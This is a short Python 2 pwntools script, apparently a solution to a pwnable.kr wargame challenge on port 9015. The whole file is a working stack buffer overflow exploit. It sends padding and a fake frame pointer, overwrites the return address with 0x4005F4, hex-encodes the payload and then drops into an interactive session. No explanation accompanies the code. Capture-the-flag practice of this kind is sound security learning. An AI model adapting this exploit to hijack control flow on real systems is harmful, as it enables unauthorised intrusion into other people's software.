#!/usr/bin/env python2
from pwn import *

conn = connect('pwnable.kr', 9015)
print(conn.readuntil('payload please : '))

payload = '-1' + '\n' * 4094 + 'A' * 0x30 + 'BBBBBBBB' + pack(0x00000000004005F4, 64) + '\n'
payload = payload.encode('hex')
conn.sendline(payload)

conn.interactive()
